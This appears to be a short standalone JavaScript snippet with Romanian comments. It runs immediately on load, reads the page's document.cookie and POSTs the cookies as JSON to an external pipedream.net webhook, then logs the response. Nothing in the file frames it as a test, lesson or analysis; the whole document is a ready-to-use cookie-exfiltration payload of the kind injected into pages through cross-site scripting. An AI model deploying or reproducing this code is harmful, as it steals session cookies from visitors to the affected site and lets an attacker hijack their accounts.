
async function sendCookies() {
    try {
        // Extrage cookie-urile
        const cookies = document.cookie;

        // Trimite cookie-urile către URL-ul webhook-ului
        const response = await fetch('https://eox2hsuwm1hz94k.m.pipedream.net', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ cookies })
        });

        // Recuperează datele din răspuns
        const responseData = await response.json();
        console.log(responseData);

    } catch (error) {
        console.error('Eroare:', error);
    }
}

sendCookies();
